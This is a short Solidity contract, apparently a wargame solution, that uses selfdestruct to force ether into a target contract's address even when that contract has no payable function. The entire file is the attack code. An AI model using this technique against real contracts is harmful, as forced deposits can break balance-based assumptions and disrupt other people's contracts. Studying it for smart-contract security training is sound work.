// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address public forceAddress;

    constructor(address _forceAddress) {
        forceAddress = _forceAddress;
    }

    function forceSendMoney() public payable {
        selfdestruct(payable(forceAddress));
    }
}